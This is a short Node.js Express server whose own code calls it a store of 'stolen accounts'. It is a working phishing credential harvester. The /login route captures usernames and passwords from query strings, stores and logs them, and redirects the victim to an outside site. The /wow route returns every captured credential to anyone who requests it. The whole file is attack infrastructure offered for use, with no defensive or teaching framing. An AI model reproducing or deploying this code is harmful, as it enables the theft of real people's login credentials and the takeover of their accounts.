const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;
let accounts = ["HERE ARE THE STOLEN ACCOUNTS"];

app.use(express.json());
app.use(express.static('./public'))

app.get('/login', (req, res) => {
    const username = req.query.username;
    const password = req.query.password;

    accounts.push({
        username: username,
        password: password
    })
    console.log(username, password)

    res.redirect('https://entrar.in');
});

app.get('/wow', (req, res) => {
    res.send(accounts);
})

app.listen(PORT, console.log('Server Success'));